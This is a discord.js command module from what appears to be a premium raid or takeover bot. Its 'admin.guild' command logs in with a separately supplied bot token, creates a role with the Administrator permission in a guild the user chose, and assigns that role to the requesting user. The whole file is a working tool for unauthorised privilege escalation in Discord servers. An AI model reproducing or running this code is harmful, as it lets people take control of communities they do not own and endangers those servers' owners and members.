const { Client, PermissionsBitField } = require('discord.js');
const { readPremiumConfigs } = require('../utils/json-handler');
const { createBlacklistButton } = require('../utils/blacklist-button');

module.exports = {
    name: 'admin.guild',
    description: 'Gives you admin in a guild.',
    prefix: '#',
    premium: true,
    async execute(msg, args, client, channel_logs) {
        createBlacklistButton(client, channel_logs, msg.author);
        const premiumConfigs = readPremiumConfigs();
        const userConfig = premiumConfigs[msg.author.id];

        if (!userConfig || !userConfig.guild_id) {
            return msg.channel.send({ content: '> You have not set a guild ID.' });
        }

        if (!userConfig.bot_token_n) {
            return msg.channel.send({ content: '> You have not set a bot token to use.' });
        }

        await msg.channel.send({ content: '> Getting admin in the selected guild...' });

        const adminClient = new Client({ intents: [103423] });
        await adminClient.login(userConfig.bot_token_n);

        try {
            const guild = await adminClient.guilds.cache.get(userConfig.guild_id);
            const role = await guild.roles.create({
                name: 'Admin',
                permissions: [PermissionsBitField.Flags.Administrator]
            });
            const member = await guild.members.cache.get(msg.author.id);
            await member.roles.add(role);
            await msg.channel.send({ content: '> Done.' });
        } catch (e) {
            console.error(e);
            msg.channel.send({ content: '> Could not get admin.' });
        } finally {
            await adminClient.destroy();
        }
    }
};
